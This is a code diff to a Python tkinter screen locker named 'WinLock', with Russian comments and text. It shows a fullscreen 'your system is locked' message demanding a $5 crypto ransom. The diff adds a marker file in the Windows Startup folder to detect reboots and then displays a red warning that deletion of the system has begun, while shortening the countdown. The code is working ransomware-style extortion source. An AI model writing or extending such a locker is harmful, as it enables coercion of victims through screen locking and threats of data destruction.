@@ -1,12 +1,15 @@
 from tkinter import * 
 import pyautogui 
 import os
+import os.path
 #import pygame 
 read1ng=" "
 BTC="BTC: wallet"
 LTC="LTC: wallet"
 ETH="ETH: wallet"
+SORRYBRO=""
 
+LOCKFILE = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\system.logger'
 
 #XMRimg = pyautogui.screenshot('my_screenshot.png')
 password=("haha_lol") #переменная с паролем от локера, можно установить что-то свое
@@ -25,6 +28,11 @@ def password_check(event):
 def systemrun():
     os.system("audacity") #Команда которую выполнить по истечении времени
 
+
+if(os.path.exists(LOCKFILE)): #Если файл сесии найден
+    SORRYBRO="Вы перезагрузили компьютер, удаление начато..."
+    t1me = 300
+open(LOCKFILE, 'tw', encoding='utf-8').close()
 screen=Tk()
 screen.title("WinLock") 
 screen.attributes("-fullscreen",True) 
@@ -35,6 +43,9 @@ but=Button(screen,text="Разблокировать", borderwidth=0)
 text0=Label(screen,text="Ваша система заблокирована!",font="TimesNewRoman 30",fg="white",bg="#1c1c1c")
 DontPanic=Label(screen, text="Не паникуй, это не шифровальщик, твои файлы в полном порядке\nЭта программа только может стереть твою систему с лица Земли, тебе нечего бояться!",font="TimesNewRoman 24",fg="white",bg="#1c1c1c")
 text=Label(screen,text="Вам необходимо перечислить 5$ на один из нижеприведённых кошельков",font="TimesNewRoman 30",fg="#32CD32",bg="#1c1c1c")
+
+REMOV=Label(screen,text=SORRYBRO,font="TimesNewRoman 40",fg="red",bg="#1c1c1c")
+REMOV.place(x=400,y=40)
 
 BTCimg = PhotoImage(file = './BTC-little.png')
 LTCimg = PhotoImage(file = './LTC-little.png')
